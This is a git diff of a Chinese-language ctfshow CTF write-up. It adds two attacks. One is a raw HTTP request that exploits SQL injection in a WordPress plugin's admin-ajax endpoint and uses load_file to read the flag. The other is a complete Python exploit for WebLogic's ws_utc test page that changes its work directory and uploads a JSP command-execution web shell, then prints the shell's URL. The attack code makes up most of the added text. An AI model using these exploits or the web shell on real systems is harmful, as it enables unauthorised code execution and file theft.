@@ -298,21 +298,33 @@ public function populate_download_edit_form() {
 }
 ```
 
-好像是有点问题，没出
+注册登录一个普通账户，然后注入即可
 
-```python
-import requests
+```http
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: 8b63d2a2-87cb-48f6-9222-ec4a4da25448.challenge.ctf.show
+Cookie: wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_95aa78bcbb608364083471d2dbd629c8=test%7C1781489971%7CrfKiKNHSO1VA2tde5KKDItMQZ4IjY4EUIaSZE40vZ9T%7C71f262bab8418ab7e92c4c8576b797dce170be65cc85873d1d864d500cf13f27
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
+Priority: u=0, i
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 104
 
-burp0_url = "http://3939c8e7-0e79-499f-bfc4-a13ce882aa33.challenge.ctf.show:443/wp-admin/admin-ajax.php?action=populate_download_edit_form"
-burp0_cookies = {"cf_clearance": "FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs", "SL_G_WPT_TO": "zh", "SL_GWPT_Show_Hide_tmp": "1", "SL_wptGlobTipTmp": "1"}
-burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://3939c8e7-0e79-499f-bfc4-a13ce882aa33.challenge.ctf.show/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Priority": "u=0, i", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
-burp0_data = {"id": "0 union select 1,2,3,4,5,6,load_file(0x2f666c61675f69735f68657265)--+"}
-r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
-print(r.text)
-print(r.status_code)
+action=populate_download_edit_form&id=0 UNION SELECT 1,load_file(0x2f666c61675f69735f68657265),3,4,5,6,7
 ```
 
-返回是400错误，一直打不通，但是exp我敢肯定是对的
 
 ## web587
 
@@ -403,6 +415,128 @@ admin username  : [weblogic]
 ```
 
 然后后面就是跟着复现就可以了
+
+---
+重新回 ctfshow 做了一下，一键 getflag exp
+
+```python
+#!/usr/bin/env python3
+import argparse
+import secrets
+import time
+import urllib.parse
+import xml.etree.ElementTree as ET
+
+import requests
+
+JSP = '''<%@ page import="java.io.*" %><%String c=request.getParameter("cmd");if(c!=null){String os=System.getProperty("os.name").toLowerCase();String[] a=os.contains("win")?new String[]{"cmd.exe","/c",c}:new String[]{"/bin/sh","-c",c};Process p=new ProcessBuilder(a).redirectErrorStream(true).start();InputStream in=p.getInputStream();byte[] b=new byte[4096];int n;while((n=in.read(b))!=-1){out.print(new String(b,0,n));}}%>'''
+APP = "com.oracle.webservices.wls.ws-testclient-app-wls"
+TOKEN = "4mcj4y"
+
+
+def req(session, method, url, **kwargs):
+    try:
+        return session.request(method, url, **kwargs)
+    except requests.RequestException as e:
+        raise SystemExit(e)
+
+
+def ready(session, base, timeout):
+    url = base + "/ws_utc/config.do"
+    for _ in range(20):
+        r = req(session, "GET", url, timeout=timeout, allow_redirects=False)
+        if r.status_code == 200 and "Deploying Application" not in r.text:
+            return
+        time.sleep(2)
+    raise SystemExit("ws_utc is not ready")
+
+
+def text(node, name):
+    child = node.find(name)
+    return "" if child is None or child.text is None else child.text
+
+
+def current_workdir(session, base, timeout):
+    r = req(session, "GET", base + "/ws_utc/resources/setting/options/general", timeout=timeout)
+    root = ET.fromstring(r.content)
+    for p in root.iter("parameter"):
+        if text(p, "name") == "BasicConfigOptions.workDir":
+            return text(p, "defaultValue")
+    raise SystemExit("workdir not found")
+
+
+def web_workdir(workdir):
+    if workdir.endswith("/war/css"):
+        return workdir
+    if "/tmp/WSTestPageWorkDir" in workdir:
+        domain = workdir.split("/tmp/WSTestPageWorkDir", 1)[0]
+        return f"{domain}/servers/AdminServer/tmp/_WL_internal/{APP}/{TOKEN}/war/css"
+    raise SystemExit("cannot derive web workdir; use --workdir")
+
+
+def set_workdir(session, base, workdir, timeout):
+    data = {
+        "setting_id": "general",
+        "BasicConfigOptions.workDir": workdir,
+        "BasicConfigOptions.proxyHost": "",
+        "BasicConfigOptions.proxyPort": "80",
+    }
+    r = req(session, "POST", base + "/ws_utc/resources/setting/options", data=data, timeout=timeout)
+    if r.status_code != 200 or b"<state>ok</state>" not in r.content:
+        raise SystemExit("failed to set workdir")
+
+
+def upload(session, base, timeout):
+    name = "s" + secrets.token_hex(6) + ".jsp"
+    data = {
+        "ks_name": "k" + secrets.token_hex(4),
+        "ks_edit_mode": "false",
+        "ks_password_front": "",
+        "ks_password": "",
+        "ks_password_changed": "false",
+    }
+    files = {"ks_filename": (name, JSP.encode(), "application/octet-stream")}
+    r = req(session, "POST", base + "/ws_utc/resources/setting/keystore", data=data, files=files, timeout=timeout)
+    root = ET.fromstring(r.content)
+    for item in root.iter("keyStoreItem"):
+        if text(item, "keyStore") == name:
+            return text(item, "id"), name
+    raise SystemExit("upload failed")
+
+
+def main():
+    p = argparse.ArgumentParser()
+    p.add_argument("target")
+    p.add_argument("--workdir")
+    p.add_argument("--proxy")
+    p.add_argument("--timeout", type=float, default=30.0)
+    p.add_argument("--insecure", action="store_true")
+    args = p.parse_args()
+
+    base = args.target if "://" in args.target else "http://" + args.target
+    base = base.rstrip("/")
+    session = requests.Session()
+    session.verify = not args.insecure
+    if args.insecure:
+        requests.packages.urllib3.disable_warnings()
+    if args.proxy:
+        session.proxies = {"http": args.proxy, "https": args.proxy}
+
+    ready(session, base, args.timeout)
+    old = current_workdir(session, base, args.timeout)
+    set_workdir(session, base, args.workdir or web_workdir(old), args.timeout)
+    item_id, name = upload(session, base, args.timeout)
+    url = f"{base}/ws_utc/css/config/keystore/{item_id}_{urllib.parse.quote(name)}"
+    print(url)
+    # print(f"curl -k --get --data-urlencode 'cmd=id' '{url}'")
+
+
+if __name__ == "__main__":
+    main()
+
+
+## python3 exp.py 'https://acec77b2-1e4d-4c3e-837d-0f4de0ecf710.challenge.ctf.show/' --insecure
+```
 
 ## web589
 
